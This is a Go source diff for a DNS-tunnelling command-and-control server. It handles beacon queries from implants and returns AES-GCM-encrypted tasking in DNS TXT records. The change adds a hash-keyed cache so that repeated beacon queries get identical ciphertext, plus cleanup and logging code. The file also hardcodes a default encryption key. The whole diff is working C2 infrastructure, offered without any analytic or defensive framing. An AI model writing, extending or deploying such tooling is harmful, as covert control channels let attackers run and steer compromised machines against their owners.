@@ -10,6 +10,7 @@ package main
 
 import (
 	"context"
+	"crypto/sha256"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -18,15 +19,19 @@ import (
 	"os"
 	"os/signal"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 )
 
 // Global variables
 var (
-	c2Manager    *C2Manager    // c2Manager handles all C2 operations including beacon management and tasking
-	masterClient *MasterClient // masterClient handles communication with Master Server (distributed mode only)
-	debugMode    bool          // debugMode enables verbose logging for troubleshooting
+	c2Manager              *C2Manager           // c2Manager handles all C2 operations including beacon management and tasking
+	masterClient           *MasterClient        // masterClient handles communication with Master Server (distributed mode only)
+	debugMode              bool                 // debugMode enables verbose logging for troubleshooting
+	encryptedResponseCache map[string]string    // Cache encrypted responses by query hash
+	responseCacheMutex     sync.RWMutex         // Mutex for encrypted response cache
+	responseCacheExpiry    map[string]time.Time // Track when cached responses should expire
 )
 
 // Build-time version information (set via -ldflags during build)
@@ -35,6 +40,15 @@ var (
 	buildDate = "unknown"
 	gitCommit = "unknown"
 )
+
+// logf is a simple logging wrapper that respects debug mode
+// In debug mode, logs everything. Otherwise, only logs warnings/errors.
+func logf(format string, args ...interface{}) {
+	// Log everything if debug mode is enabled, or if it's a warning/error
+	if debugMode || strings.Contains(format, "WARNING") || strings.Contains(format, "ERROR") || strings.Contains(format, "Failed") {
+		fmt.Printf(format+"\n", args...)
+	}
+}
 
 /*
 	forwardDNSQuery forwards a DNS query to an upstream DNS server and returns the response.
@@ -244,6 +258,9 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 
 		// Process potential C2 beacon query
 		if c2Response, isC2 := c2Manager.processBeaconQuery(qname, clientIP); isC2 {
+			// Create hash of the query for caching encrypted responses
+			queryHash := fmt.Sprintf("%x", sha256.Sum256([]byte(qname)))
+
 			// Create C2 response
 			var answers []DNSResourceRecord
 
@@ -289,11 +306,35 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 					logf("[DEBUG] Base36 Encoded (len=%d): %s", len(encoded), encoded)
 				} else {
 					// Beacon response - use AES-GCM + base36
-					var encErr error
-					encoded, encErr = encryptAndEncode(c2Response, c2Manager.GetEncryptionKey())
-					if encErr != nil {
-						// Fallback to plain response if encryption fails
-						encoded = c2Response
+					// Check if we have a cached encrypted response for this query
+					responseCacheMutex.RLock()
+					cachedEncrypted, hasCached := encryptedResponseCache[queryHash]
+					cacheExpiry, hasExpiry := responseCacheExpiry[queryHash]
+					responseCacheMutex.RUnlock()
+
+					if hasCached && hasExpiry && time.Now().Before(cacheExpiry) {
+						// Use cached encrypted response (ensures identical ciphertext for duplicates)
+						encoded = cachedEncrypted
+						if debugMode {
+							logf("[DEBUG] Using cached encrypted response for query hash: %s", queryHash[:16])
+						}
+					} else {
+						// Encrypt and cache the response
+						var encErr error
+						encoded, encErr = encryptAndEncode(c2Response, c2Manager.GetEncryptionKey())
+						if encErr != nil {
+							// Fallback to plain response if encryption fails
+							encoded = c2Response
+						} else {
+							// Cache the encrypted response for 5 minutes
+							responseCacheMutex.Lock()
+							encryptedResponseCache[queryHash] = encoded
+							responseCacheExpiry[queryHash] = time.Now().Add(5 * time.Minute)
+							responseCacheMutex.Unlock()
+							if debugMode {
+								logf("[DEBUG] Cached encrypted response for query hash: %s", queryHash[:16])
+							}
+						}
 					}
 				} // TXT records need proper length-prefixed format
 				// Each string in a TXT record can be max 255 bytes
@@ -562,6 +603,32 @@ func main() {
 	}
 	debugMode = cfg.Debug
 
+	// Initialize encrypted response cache
+	encryptedResponseCache = make(map[string]string)
+	responseCacheExpiry = make(map[string]time.Time)
+
+	// Start cache cleanup routine (runs every 10 minutes)
+	go func() {
+		ticker := time.NewTicker(10 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			now := time.Now()
+			responseCacheMutex.Lock()
+			expiredCount := 0
+			for hash, expiry := range responseCacheExpiry {
+				if now.After(expiry) {
+					delete(encryptedResponseCache, hash)
+					delete(responseCacheExpiry, hash)
+					expiredCount++
+				}
+			}
+			responseCacheMutex.Unlock()
+			if debugMode && expiredCount > 0 {
+				logf("[Cache] Cleaned up %d expired encrypted responses", expiredCount)
+			}
+		}
+	}()
+
 	// SECURITY: Warn if using default encryption key
 	if cfg.EncryptionKey == "MySecretC2Key123!@#DefaultChange" {
 		fmt.Println("⚠️  WARNING: Using default encryption key! Change this in production!")
@@ -731,9 +798,6 @@ func main() {
 			logf("[Distributed] Synced %d beacon(s) from master", len(beacons))
 		}
 	})
-
-	fmt.Println("Console disabled (distributed mode - use Master server web UI)")
-	fmt.Println()
 
 	// Setup graceful shutdown
 	shutdownChan := make(chan os.Signal, 1)
